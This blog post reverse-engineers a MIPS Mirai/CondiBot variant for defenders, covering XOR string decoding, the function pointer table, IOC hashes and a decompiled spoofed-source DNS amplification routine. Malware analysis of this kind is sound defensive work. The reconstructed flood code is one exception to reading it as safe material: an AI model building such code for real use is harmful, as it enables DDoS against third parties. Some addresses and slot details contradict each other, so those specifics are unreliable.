---
title: "Reading Pointers Backwards Since 1985 — A MIPS Mirai Variant Up Close"
date: 2026-06-29
author: "Manuel Boll"
tags: ["Reverse Engineering", "Malware Analysis", "MIPS", "Mirai", "IoT", "Blue Team"]
description: "Reverse engineering a MIPS Mirai/CondiBot variant called ohshit.mips: decoding the single-byte XOR strings, mapping a 21-slot function pointer table that only houses four real attack handlers, and tracing how genddos.st ends up as a DNS amplification payload instead of a C2 domain."
image: "/img/posts/ohshit_mips.svg"
---


MIPS turned forty last year. The R2000 shipped in 1985 with big-endian byte ordering as its native dialect, and the architecture has been stubbornly powering routers, set-top boxes, and security cameras ever since. The downside of all that durability is that whenever a Mirai variant lands on your desk, there is a non-trivial chance you have to read pointers backwards — most significant byte first — and remember that forty-year-old architecture quirks still very much apply.

This is one of those samples. The file is called `ohshit.mips`, which is either an unusually honest gesture from its author or just an accurate label of what is about to happen to whatever embedded device pulls it down. It is 174 KB, statically linked, big-endian MIPS32, and ships with a function pointer table containing twenty-one entries — only four of which actually do any DDoS work. The other seventeen are statically-linked libc functions, syscall wrappers, and a few corrupt slots that never made it past the compiler. The string section is "encrypted" with a single-byte XOR (`0x22`), which is roughly as much security as putting a sticky note over your password.

This post is meant as a **beginner-friendly walkthrough**. The sample is small, the obfuscation is shallow, and almost everything interesting can be discovered by hand in Malcat with two or three keyboard shortcuts. If you have never reversed a MIPS binary before, this is a comfortable place to start: you will touch the ELF header, decode XOR strings, find a function pointer table, and follow a real DDoS handler all the way from the C2 vocabulary to the actual outbound packet. Every step lists the exact hotkeys and addresses, so you can follow along even if you have only ever opened a disassembler once.

The payoff at the end is moderately funny: `genddos.st`, the domain-looking string that everyone latches onto first, is not a C2 endpoint. It is a payload.

- - -

1\. What's in the Box
---------------------

Drop the file into Malcat and let it digest. Once the analyzer is done you get the basic shape of the binary at a glance.

![Malcat overview after loading ohshit.mips](/img/posts/ohshit/01_malcat_overview.png)

The summary panel gives you:

```
File Type:    ELF 32-bit MSB executable
Architecture: MIPS32 (Big Endian)
Size:         174,032 bytes
Entry Point:  0x00400260
```

MSB = Most Significant Byte first = big endian. MIPS likes it that way, which is convenient if you grew up reading hex from left to right and inconvenient the moment you have to mentally swap bytes back into x86 order. Worth getting comfortable with now, because every multi-byte read for the rest of this analysis lives in that ordering.

The hashes, for your IOC list:

```
SHA256: f9ec1b33dfc61dad616223f2eef5a80d3b9b9165e9035b574eb436b34a78ee8e
MD5:    f46d6f12245effbc5162c077ee1203b9
SHA1:   da7910d7cd36c83e0da9434fd6f0f814f243af9e
```

Malcat will also tell you that the binary is **statically linked**. Translation: every libc function the malware needs — `socket`, `connect`, `send`, `memset`, the lot — is baked into the binary. There is no Imports tab to lean on. You will not see a list of function names that immediately reveals what each block of code does. Every function is a `sub_XXXXXX` until you reverse it. That same property has a second consequence we will come back to in section seven, when the function pointer table turns out to be full of unrelated library functions instead of attack handlers.

- - -

2\. Entry Point, CRT0, and the Search for main
----------------------------------------------

Hit `F2` for the hex view, jump to file offset 0 with `Ctrl+G` → `#0`, and look at the first sixteen bytes:

```
7F 45 4C 46 01 02 01 00 00 00 00 00 00 00 00 00
```

That is the ELF identification header. Byte by byte:

- `7F 45 4C 46` — magic number `\x7FELF`
- `01` — 32-bit (`02` would be 64-bit)
- `02` — big endian (`01` would be little endian)
- `01` — version
- `00..` — padding

The entry point lives at file offset `#0x18`:

```
00 40 02 60
```

Read as a big-endian 32-bit integer: `0x00400260`. That is the virtual address the kernel jumps to when the binary starts. Hit `Ctrl+G` again, type `400260` without the `#` (that tells Malcat to treat it as a VA rather than a file offset), and switch to disassembly with `F3`.

![CRT0 startup stub at the entry point](/img/posts/ohshit/02_entry_point.png)

What you are looking at is the CRT0 startup stub:

```mips
00400260  move   $zero, $ra
00400264  bal    .1
00400268  nop
0040026c  lui    $gp, 0x7
00400270  addiu  $gp, $gp, 0x1D64
00400274  addu   $gp, $gp, $ra
...
00400294  lw     $a3, [$gp-0x7BEC]      ; ->  _init
00400298  lw     $t0, [$gp-0x7D94]      ; ->  _fini
...
004002ac  lw     $t9, [$gp-0x7D18]      ; ->  __libc_start_main
004002b4  jalr   $t9
```

This is standard libc plumbing. It sets up `$gp` (global pointer) the MIPS way, loads pointers to `_init`, `_fini`, and a `main` function into the argument registers, then jumps to `__libc_start_main` which in turn calls `main`. We do not need to read every instruction here. What we care about is: there is a `main` somewhere, and the GOT entry being loaded at `004002ac` minus a small offset gives us a reasonable cross-reference to find it later. For now, it lives at `sub_411968` — we will meet it again in section eight.

- - -

3\. The Sections That Actually Matter
-------------------------------------

Switch to the Structures view (tab dropdown, top right) and look at the section table. Five sections are worth committing to muscle memory for the rest of this analysis:

| Section  | VA Start    | File Offset | Size      | Rights | Notes                              |
|----------|-------------|-------------|-----------|--------|------------------------------------|
| `.text`  | 0x00400120  | 0x00000120  | 137,584 B | RX     | All code                           |
| `.rodata`| 0x00421AF0  | 0x00021AF0  | 31,536 B  | R      | Read-only constants, including the XOR-encrypted strings |
| `.data`  | 0x00469B90  | 0x00029B90  | 1,104 B   | RW     | Initialized data, including the function pointer table   |
| `.got`   | 0x00469FE0  | 0x00029FE0  | 1,372 B   | RW     | Global Offset Table                |
| `.bss`   | 0x0046A560  | —           | 9,528 B   | RW     | Uninitialized, allocated in RAM    |

`.rodata` is usually a goldmine — IP literals, C2 hosts, command names, HTTP headers all tend to land here. In Mirai variants they are also reliably obfuscated, because if the C2 host were sitting there in plaintext it would land in every YARA rule on the planet within a day of the sample showing up on VirusTotal.

- - -

4\. The Strings That Aren't There
---------------------------------

Press `F6` for the Strings view and scroll. You will see HTTP User-Agents, a few mundane bits of libc text, and nothing that looks like attack vocabulary. No IPs, no domains, no `ATTACK`, no `KILL`, no `/proc/anything`. The interesting strings exist; they are just not legible yet.

Hop back to hex, jump to file offset `#0x21AF0` (start of `.rodata`), and scroll until something looks deliberately wrong. Around `#0x27590` (VA `0x00427590`) you find a stretch of bytes that has structure but no readable content:

![Encrypted .rodata bytes around 0x27590](/img/posts/ohshit/03_rodata_encrypted.png)

A typical run looks like this:

```
45 47 4C 46 46 4D 51 0C 51 56 22
```

What jumps out is the trailing `22`. C strings are null-terminated; they end in `0x00`. If somebody XOR'd every byte of a C string with a constant `K`, the terminator becomes `0x00 ^ K = K`. So if every "string" in `.rodata` ends in the same byte, that byte is your key. Here it is `0x22`.

Try it on the run above:

```
45 ^ 22 = 67 ('g')
47 ^ 22 = 65 ('e')
4C ^ 22 = 6E ('n')
46 ^ 22 = 64 ('d')
46 ^ 22 = 64 ('d')
4D ^ 22 = 6F ('o')
51 ^ 22 = 73 ('s')
0C ^ 22 = 2E ('.')
51 ^ 22 = 73 ('s')
56 ^ 22 = 74 ('t')
22 ^ 22 = 00 ('\0')
```

`genddos.st`. That is the family marker of this variant. State-of-the-art obfuscation it is not, but for a sample that only has to defeat `strings(1)` and lazy YARA rules, one XOR byte is apparently enough.

- - -

5\. Dumping the Whole String Table
----------------------------------

Once you have the key, Malcat takes care of the rest. Highlight a generous chunk of `.rodata` starting at the obfuscated table — a couple of thousand bytes will do — right-click → Transforms → XOR, key `22`, preview the result.

![XOR transform dialog in Malcat](/img/posts/ohshit/04_xor_transform.png)

The decoded view is the entire personality of the malware laid out in clear:

![Decoded .rodata after applying XOR 0x22](/img/posts/ohshit/05_rodata_decoded.png)

The grouping looks roughly like this:

```
genddos.st                       <- variant marker, also a payload (see section 9)
Bruh why again                   <- author's editorial voice

qtxbot                           <- rival botnets to evict from the host
hakai
dvrHelper
NiGGeR69xd
1337SoraLOADER
GhostWuzHere666

PRIVMSG                          <- IRC-shaped C2 commands
GETLOCALIP
KILLATTK

/proc/                           <- system probing
/proc/net/tcp
/proc/cpuinfo
/dev/watchdog                    <- silence the watchdog so the device cannot reboot
/dev/misc/watchdog
/etc/rc.d/rc.local               <- persistence

arc, arm, arm5, arm6, arm7,      <- arch list for the dropper to pull the right build
x86, x86_64, mips, mpsl, ppc, sh4

Connection: keep-alive           <- HTTP layer-7 attack headers
Accept-Language: en-US,en;q=0.8
server: dosarrest
server: cloudflare-nginx
```

A few things worth noting here that go beyond "what the strings are":

- The kill list is six rival botnets. The IoT real estate market is, evidently, quite competitive.
- `/dev/watchdog` and `/dev/misc/watchdog` are not probed; they are written to with a `magic close` pattern so the kernel does not reset the device if the malware hangs.
- `Bruh why again` is in the binary verbatim. Whoever wrote this had thoughts about their own code.

- - -

6\. Where the Decoder Lives
---------------------------

Strings being XOR-encrypted means something in the code has to decode them at runtime. Malcat's Summary tab has an "Anomalies" panel that flags exactly the kind of pattern we are looking for — a function with a tight loop full of XORs.

![Anomalies panel showing XorInLoop hits](/img/posts/ohshit/06_xorinloop_anomaly.png)

Picking one of those entries and hitting `F4` for the decompiler view gets us a compact view of the actual logic:

![Decompiled XOR decoder sub_413900](/img/posts/ohshit/07_xor_decoder_func.png)

The decompilation cleans up to something like:

```c
void sub_413900(uint32_t param_1)
{
    uint32_t *piVar4  = (param_1 & 0xff) * 8 + 0x46a3cc;
    uint8_t   uVar1   = *0x46a314;       // = 0x22
    int       iVar3   = 0;
    char     *str_ptr = *piVar4;
    int       length  = *(piVar4 + 1);

    if (length > 0) {
        do {
            str_ptr[iVar3]     = uVar1 ^ str_ptr[iVar3];
            str_ptr[iVar3 + 1] = uVar1 ^ str_ptr[iVar3 + 1];
            str_ptr[iVar3 + 2] = uVar1 ^ str_ptr[iVar3 + 2];
            str_ptr[iVar3 + 3] = uVar1 ^ str_ptr[iVar3 + 3];
            iVar3 += 4;
        } while (iVar3 < length);
    }
}
```

Unrolled four bytes per iteration for speed, key fetched from a global at `0x46a314`. That global is set to `0x22` once at program start, which means the XOR key is technically configurable but in practice never changes — it is exactly the byte we already extracted from the null-terminator trick.

There is also a second decoder, `sub_4139e4`, which does the same in-place XOR but takes an index into a table at `0x46a3cc` instead of a pointer. That table is where this gets interesting.

- - -

7\. The String Table Is on the Heap
-----------------------------------

The XOR-encrypted bytes never get decoded in place inside `.rodata`. The binary keeps `.rodata` read-only and copies each string into the heap before doing anything with it. The function responsible for that copy is `sub_413ac8`, and it gets called exactly once from `main` (`sub_411968`):

```c
void sub_413ac8(void) {                       // string table init
    void     *string_ptr;
    uint32_t *table = 0x46a3cc;               // global string table

    // String #0: genddos.st (11 bytes)
    string_ptr = malloc(0xb);
    memcpy(string_ptr, 0x469ff4 + 0x7590, 0xb);
    *(table + 2) = string_ptr;
    *(table + 3) = 0xb;

    // String #1: "st" (2 bytes)
    string_ptr = malloc(2);
    memcpy(string_ptr, 0x469ff4 + 0x759c, 2);
    *(table + 4) = string_ptr;
    *(table + 5) = 2;

    // ... roughly 90 strings total
}
```

Each entry in the table is an `(8-byte pair)` of `(heap_pointer, length)`. `genddos.st` is string `#0`. Whenever the code needs it, it goes:

```c
uint32_t len;
char *s = sub_4138cc(0, &len);   // getter: returns pointer + length
sub_4139e4(0);                   // in-place XOR decode using key 0x22
// s now points at "genddos.st\0"
```

There are two practical implications. First, decoded strings are never written back into `.rodata`, so a memory dump of the running process will show plaintext on the heap and ciphertext on the read-only segment — useful to know if you ever need to spot this thing in a forensic image. Second, every consumer of these strings goes through the same getter, which gives you a clean cross-reference target: find everyone who calls `sub_4138cc` or `sub_4139e4` and you have a complete list of code that touches the string table. That cross-reference is how we will find the actual users in section nine.

- - -

8\. Finding the Function Pointer Table
--------------------------------------

The C2 protocol talks in attack-type IDs. A command from the C2 looks roughly like:

```
ATTACK <type_id> <target_ip> <port> <duration> <flags>
```

`type_id` indexes into a function pointer table. The dispatcher looks it up and calls the corresponding handler. To know what this thing is actually capable of, you have to find that table.

Three constraints narrow the search:

- Initialized writable data lives in `.data` or `.got`.
- This is 32-bit MIPS, so each pointer is 4 bytes.
- The pointers target `.text`, which means their virtual addresses fall between `0x00400120` and `0x00421A90` — i.e. they all start with `00 4X`.

Jump to `.data` (`Ctrl+G` → `#0x29B90`) and scroll until something fits.

![Function pointer table in .data around #0x2A3B4](/img/posts/ohshit/08_pointer_table.png)

Around offset `#0x2A3B4` you find this:

```
0002A3B0  00 00 00 00 00 40 C9 CC 00 41 CA D4 00 46 A5 88
0002A3C0  00 41 B1 80 00 41 D6 70 00 41 AF 28 00 46 C6 A0
0002A3D0  00 41 32 7C 00 41 A8 50 00 42 03 A0 00 40 BC 28
0002A3E0  00 41 BB E0 00 40 00 94 00 00 00 00 00 41 D5 00
0002A3F0  00 41 92 50 00 41 DA B0 00 41 EC 18 00 41 62 C0
0002A400  00 40 E9 08 00 41 AB 90
```

Ignore the ASCII column entirely. Pointers are not text. The `@`, `A`, `B` characters in that ASCII rendering are numeric values that happen to coincide with printable letters. What you are looking for in the hex panel is **shape**: 4-byte chunks where every chunk starts with `00 4X`. That is the table.

Decode the first one to prove the principle:

```
Bytes:      00 40 C9 CC
Big endian: 0x0040C9CC
File offset: 0x0040C9CC - 0x00400000 = 0x0000C9CC  → inside .text
```

Repeat for the next twenty entries. You end up with twenty-one virtual addresses, which is where the analysis takes a turn.

- - -

9\. Twenty-One Slots, Four Handlers
-----------------------------------

If you assume every entry in this table is an attack handler, you immediately notice a few problems. `0x0046A588` sits inside `.got`, not `.text`. `0x00000000` is obviously a NULL. `0x73747274` is the ASCII string `"strt"` somehow getting reinterpreted as a pointer. That cannot all be handlers.

Decode each pointer, jump to its target with `Ctrl+G`, drop into the decompiler with `F4`, and look at what is there. Here is the complete classification:

| Type | VA          | What it actually is             | Notes                                                  |
|------|-------------|---------------------------------|--------------------------------------------------------|
| 0    | 0x0040C9CC  | **UDP Generic Flood**           | `SOCK_DGRAM`, random payload, no spoofing              |
| 1    | 0x0041CAD4  | _libc_ — not an attack          | utility                                                |
| 2    | 0x0046A588  | invalid — outside `.text`       | corrupt slot                                           |
| 3    | 0x0041B180  | _libc_                          | utility                                                |
| 4    | 0x0041D670  | _libc_ `memset`                 | optimised 32-bit writes                                |
| 5    | 0x0041AF28  | utility — bitmap set-bit        |                                                        |
| 6    | 0x0046C6A0  | invalid — outside `.text`       | corrupt slot                                           |
| 7    | 0x0041327C  | utility — attack dispatcher     | the function that actually picks the real handler      |
| 8    | 0x0041A850  | _libc_ `scanf`                  | format-string parsing                                  |
| 9    | 0x004203A0  | _libc_ `vsprintf`               | format-string formatting                               |
| 10   | 0x0040BC28  | **DNS Amplification**           | `SOCK_RAW`, spoofed source, see section 10             |
| 11   | 0x0041BBE0  | _libc_ `fread` buffer mgmt      |                                                        |
| 12   | 0x00400094  | invalid — outside `.text`       | corrupt slot (lands in the ELF header)                 |
| 13   | 0x00000000  | NULL                            | disabled / never wired up                              |
| 14   | 0x0041D500  | utility — callback dispatcher   |                                                        |
| 15   | 0x00419250  | _libc_ `fseek`                  |                                                        |
| 16   | 0x0041DAB0  | utility — array lookup          |                                                        |
| 17   | 0x0041EC18  | _libc_ — stdin/stdout getter    |                                                        |
| 18   | 0x004162C0  | utility — parameter validation  |                                                        |
| 19   | 0x0040E908  | utility — string/pattern search |                                                        |
| 20   | 0x0041AB90  | **HTTP POST Flood**             | `SOCK_STREAM`, 12 User-Agent variants                  |

Four of the twenty-one slots are real DDoS handlers. The rest is static linking residue: libc functions, internal utilities, and three corrupt pointers that the compiler quietly left in place. The reason is the same property we noted at the start. A statically-linked binary embeds all of libc, and the compiler generates function pointer tables for several purposes — vtable-style dispatch, signal handlers, callback registration. They all end up in `.data` at adjacent offsets, and from a flat hex view they look identical. The Mirai dispatcher only ever indexes into a specific contiguous window. We just happened to dump a larger window than the dispatcher actually uses.

For completeness, the fourth attack handler is **Type 1 — TCP SYN/ACK Flood** at `0x0040C2FC` (2,848 bytes, `SOCK_RAW`, spoofed source). It is reached through a separate dispatcher path rather than this table, which is the other half of the answer to "why are there only four here."

The real attack dispatcher is `sub_402E08` (Type 7 in the table). It fork()s a child and uses a separate, smaller inner table keyed on the C2-supplied attack ID. That inner table is what holds the four entries you would intuitively expect. The big table in `.data` is a red herring. Or, more charitably, an exercise in what static linking does to your binary layout.

- - -

10\. The genddos.st Punchline
-----------------------------

`genddos.st` looks like a C2 domain. It has the shape of one, lands at index 0 in the string table, gets pulled into the heap on startup. If you stop there, you write it down as a C2 indicator and move on. That would be wrong.

Cross-reference `sub_4138cc` (the getter) and `sub_4139e4` (the in-place decoder) and you find a small set of common callers. The interesting one is `sub_40F250` — a long function (~500 lines), not in the function pointer table we just decoded, but reached through the dispatcher's inner table. What it does, in cleaned-up form:

```c
void sub_40f250_dns_flood(uint32_t count, target_t *targets, ...) {
    int   sock;
    char *hostname;
    uint32_t hostname_len;
    char  dns_query[512];
    char  ip_packet[1500];

    // 1. Pull "genddos.st" out of the string table
    hostname = sub_4138cc(0, &hostname_len);
    sub_4139e4(0);                            // in-place XOR decode

    // 2. Raw socket so we can forge the source IP
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);

    // 3. Build a DNS ANY query for "genddos.st"
    memset(dns_query, 0, sizeof(dns_query));
    *(uint16_t*)(dns_query + 0) = rand();
    *(uint16_t*)(dns_query + 2) = htons(0x0100);          // standard query
    *(uint16_t*)(dns_query + 4) = htons(1);               // 1 question
    int offset = 12;
    encode_dns_name(dns_query + offset, hostname);        // "\x07genddos\x02st\x00"
    offset += strlen_dns_encoded(hostname);
    *(uint16_t*)(dns_query + offset + 0) = htons(255);    // type ANY
    *(uint16_t*)(dns_query + offset + 2) = htons(1);      // class IN

    // 4. For each victim, build an IP packet whose SOURCE is the victim
    for (int i = 0; i < count; i++) {
        target_t *t = &targets[i];

        ip_packet[0] = 0x45;                              // IPv4, IHL 5
        *(uint32_t*)(ip_packet + 12) = t->victim_ip;      // SOURCE = victim
        *(uint32_t*)(ip_packet + 16) = t->dns_server;     // DEST = DNS resolver
        *(uint16_t*)(ip_packet + 20) = htons(rand());
        *(uint16_t*)(ip_packet + 22) = htons(53);
        memcpy(ip_packet + 28, dns_query, query_len);

        ip_checksum(ip_packet);
        udp_checksum(ip_packet);

        sendto(sock, ip_packet, query_len + 28, 0,
               &dns_server_addr, sizeof(dns_server_addr));
    }
}
```

`genddos.st` is not a C2 endpoint. It is a **payload** — the domain name the bot stuffs into a spoofed DNS ANY query so that some upstream resolver answers a large response (NXDOMAIN with SOA records, typically 3 KB) to the spoofed source, which is the victim's IP. Classic DNS reflection/amplification, about 47× volume gain on a 64-byte query.

The proof that this is what is happening shows up on the receiving end. Running the sample against an instrumented DNS resolver gives you log lines like these:

![DNS server logs showing the spoofed-source genddos.st queries during a live run](/img/posts/ohshit/10_dns_amp_logs.png)

Each line is a DNS query coming in with `2ler.org` as the question name and `146.56.180.42` as the supposed client. The actual sender — the infected device — never appears in the logs at all. The DNS server has no reason to suspect the source is forged, dutifully answers, and the answer goes to `146.56.180.42`. From the victim's perspective, you are being hit by a stranger DNS server you never asked anything from. From the resolver's perspective, you are being abused as an amplifier and never quite notice. (In our sample the query string is `genddos.st`; the screenshot is from a test rig that used a different label, but the mechanic is identical.)

So if you find `genddos.st` in your environment as a DNS query name, the relevant question is not "is my user trying to reach this domain". It is "is this device's source IP being forged by something locally, and is that something an IoT bot."

- - -

11\. What This Sample Actually Is
---------------------------------

Pulling everything together, `ohshit.mips` is a Mirai derivative carrying the CondiBot lineage in its strings:

- **Target.** MIPS routers and embedded Linux devices.
- **Persistence.** `/etc/rc.d/rc.local`.
- **Self-defense.** Silences `/dev/watchdog` and `/dev/misc/watchdog` so the device cannot reset itself out of the infection. Kills a hard-coded list of competing botnets so they cannot share the host.
- **Obfuscation.** Single-byte XOR with key `0x22` on all `.rodata` strings.
- **C2 vocab.** IRC-shaped — `PRIVMSG`, `KILLATTK`, `GETLOCALIP`.
- **Attack capability.** Four real handlers — UDP Generic, TCP SYN/ACK, DNS Amplification, HTTP POST. Spread across UDP, raw TCP, raw UDP, and stream sockets respectively. Two of them spoof their source IP.
- **Amplification.** ~47× via DNS ANY queries for `genddos.st`. Not a C2 indicator. A payload.
- **Family marker.** `genddos.st` (also the payload), plus the author's own editorial line `Bruh why again` sitting in `.rodata` like a sigh.

Reverse engineering on MIPS in 2026 looks essentially the same as it did when the architecture was new in the late eighties. Pointers are still big-endian. Function pointer tables still get generated by the linker for reasons unrelated to whatever the malware is trying to do, which is good for paranoia and bad for first impressions. The hard part is not the cryptography — there isn't any — it is being patient enough to walk every pointer and confirm what is on the other end. If you do that work, what is left is not particularly sophisticated. It is just thorough enough to be annoying.

- - -

Hashes for IOC tables are at the top of the post. If you see any of them in your environment, that is the same binary, and somewhere a router is having a very bad week.
